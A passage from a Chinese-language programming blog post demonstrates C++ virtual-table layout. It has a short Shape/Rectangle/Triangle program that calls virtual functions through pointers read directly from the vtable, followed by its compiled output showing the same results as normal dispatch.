<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> width,height;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Shape</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>)&#123;</span><br><span class="line">        width = a;</span><br><span class="line">        height = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar fun width:%d\n&quot;</span>,width);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rectangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Triangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Triangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//void sayHello()&#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Triangle\n&quot;);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun2\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    shape-&gt;<span class="built_in">bar</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">area</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">sayHello</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*BAR_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*AREA_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*SAYHELLO_FUN)</span><span class="params">(<span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>* (ADRESS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bar不是虚函数,直接赋值函数指针 */</span></span><br><span class="line">    BAR_FUN bar_fun = (BAR_FUN)(&amp;Shape::bar); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 获取vtable地址 */</span></span><br><span class="line">    ADRESS *vtable_addr = *((ADRESS**)(shape)); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 通过vtable赋值函数指针 */</span></span><br><span class="line">    AREA_FUN area_fun = (AREA_FUN)(*vtable_addr); </span><br><span class="line">    SAYHELLO_FUN sayhello_fun = (SAYHELLO_FUN)*(vtable_addr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 通过函数指针执行虚表函数 */</span></span><br><span class="line">    <span class="built_in">bar_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">    <span class="built_in">area_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">    <span class="built_in">sayhello_fun</span>((<span class="keyword">void</span>*)shape);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Shape* shape = <span class="keyword">new</span> <span class="built_in">Rectangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Triangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Shape</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="built_in">test2</span>(shape);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;------\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>test2 和 test 完全不同</li>
<li>test2 没有采用 cpp 规定的形式来调用虚表函数，而是利用函数指针来调用它们</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> g++ test.cpp -o test -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape</span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape</span><br><span class="line">------</span><br></pre></td></tr></table></figure>
<ul>
<li>可以正常执行，test 和 test2 没有任何差别</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">219</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">133</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">44:02</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
